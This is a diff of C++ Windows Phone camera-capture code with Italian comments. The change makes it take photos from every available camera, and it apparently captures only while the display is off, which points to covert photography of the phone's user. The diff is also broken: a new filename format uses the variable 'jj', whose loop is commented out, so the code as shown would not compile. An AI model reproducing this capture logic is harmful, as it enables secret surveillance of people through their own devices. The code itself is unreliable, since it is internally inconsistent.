@@ -196,9 +196,12 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 			
 		//cattura da tutte le camere disponibili
 		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
-		/////for(int i=0;i<pAvailableSensorLocations->Size;i++)
-		for(int i=1;i<2;i++) //forzo 0=back 1=front
+		for(int i=0;i<pAvailableSensorLocations->Size;i++)
+		/////for(int i=1;i<2;i++) //forzo 0=back 1=front
 		{
+			
+		  ///for(int jj=0;jj<3;jj++)
+		  {
 			//controlla che non vi sia il display acceso
 			//serve sugli htc sui nokia sembrerebbe non servire da gestire in un secondo tempo
 			if(ChekDisplayOn()==TRUE) break;
@@ -257,7 +260,7 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
 						
 						
-						sprintf(nomeFile,"photo_%i_%s.jpg",SL,nomeFileBase);
+						sprintf(nomeFile,"photo_%i_%s_%i.jpg",SL,nomeFileBase,jj);
 
 						OutputDebugStringA(nomeFile);
 						OutputDebugStringA("\n");
@@ -310,8 +313,10 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 		
 	).wait();
 		
+		}
 		//aspetto un sec prima di catturare dalla seconda camera
 		_Sleep(1000);
+		
 	}
 
 
